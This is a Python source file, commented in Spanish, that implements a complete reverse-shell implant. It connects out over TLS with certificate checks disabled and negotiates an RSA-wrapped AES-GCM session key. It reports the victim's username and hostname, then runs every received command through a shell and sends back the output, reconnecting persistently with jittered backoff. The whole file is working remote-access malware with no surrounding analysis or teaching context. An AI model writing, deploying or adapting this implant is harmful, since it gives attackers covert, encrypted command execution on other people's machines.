#!/usr/bin/env python3
import socket
import ssl
import os
import struct
import time
import subprocess
import hashlib
import sys
import tempfile
import random
import platform
import getpass
import json

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Configuración de conexión
PROXY_HOST = "localhost"
PROXY_PORT = 9948
TIMEOUT_INACTIVIDAD = 86400  # segundos de inactividad antes de autodestruir

# Reconexión exponencial con jitter
RECONNECT_INITIAL_INTERVAL = 5
RECONNECT_MAX_INTERVAL     = 300

# Contexto TLS (sin verificación de certificado)
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def send_encrypted_message(sock, plaintext: str, aes_key: bytes):
    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, plaintext.encode(), None)
    msg = nonce + ct
    sock.sendall(struct.pack('!I', len(msg)) + msg)

def receive_encrypted_message(sock, aes_key: bytes):
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    length = struct.unpack('!I', raw_len)[0]
    data = recvall(sock, length)
    if not data:
        return None
    nonce, ct = data[:12], data[12:]
    aesgcm = AESGCM(aes_key)
    return aesgcm.decrypt(nonce, ct, None).decode()

def banner():
    usr = getpass.getuser()
    nod = platform.node()
    pyv = platform.python_version()
    return f"[+] Connected as {usr}@{nod} (Python {pyv})"

def execute_command(cmd):
    if cmd.startswith("cd "):
        try:
            os.chdir(cmd[3:].strip())
            return f"[+] Changed dir to {os.getcwd()}"
        except Exception as e:
            return f"[-] {e}"
    p = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return (p.stdout or p.stderr).strip() or "[+] Done."

def connect():
    backoff = RECONNECT_INITIAL_INTERVAL
    while True:
        try:
            raw = socket.socket()
            raw.connect((PROXY_HOST, PROXY_PORT))
            tls = ssl_context.wrap_socket(raw, server_hostname=PROXY_HOST)
            backoff = RECONNECT_INITIAL_INTERVAL

            # Recibir clave pública y enviar AES
            data = tls.recv(4096)
            server_pub = serialization.load_pem_public_key(data)
            aes_key = os.urandom(32)
            enc = server_pub.encrypt(
                aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            tls.sendall(struct.pack('!I', len(enc)) + enc)

            send_encrypted_message(tls, banner(), aes_key)

            while True:
                cmd = receive_encrypted_message(tls, aes_key)
                if not cmd:
                    break
                res = execute_command(cmd)
                send_encrypted_message(tls, res, aes_key)

        except Exception:
            pass
        finally:
            try:
                tls.close()
            except:
                pass

        # Esperar antes de reintentar
        wait = backoff + random.uniform(0, backoff * 0.1)
        time.sleep(wait)
        backoff = min(backoff * 2, RECONNECT_MAX_INTERVAL)

if __name__ == "__main__":
    connect()
